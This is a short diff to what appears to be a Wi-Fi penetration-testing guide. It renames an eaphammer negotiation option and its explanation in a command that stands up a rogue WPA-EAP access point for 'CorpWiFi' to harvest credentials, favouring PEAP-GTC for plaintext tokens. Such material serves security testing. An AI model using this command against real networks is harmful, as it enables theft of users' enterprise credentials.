@@ -21,10 +21,10 @@ outer security mode.
 ```
 eaphammer --interface wlan0 --essid "CorpWiFi" \
           --creds --auth wpa-eap \
-          --negotiate downgrade
+          --negotiate weakest
 ```
 
-`downgrade` tells the tool to accept whatever weaker inner method the
+`weakest` tells the tool to accept whatever weaker inner method the
 client offers — PEAP-GTC is the sweet spot because GTC sends the
 token in plaintext under the tunnel.
 
